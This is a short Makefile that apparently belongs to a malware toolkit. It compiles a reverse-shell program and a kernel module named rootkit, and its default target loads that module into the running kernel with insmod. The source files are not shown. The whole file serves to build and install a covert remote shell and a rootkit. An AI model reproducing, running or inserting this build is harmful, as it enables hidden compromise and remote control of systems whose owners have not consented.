.PHONY: all
obj-m := rootkit.o 
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
all: revshell rootkit

revshell:
	gcc -o revshell revshell.c

rootkit:
	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)
	insmod rootkit.ko
	
clean:
	rm -rf *.o *.ko *.symvers *.mod.* *.order revshell
	rmmod rootkit
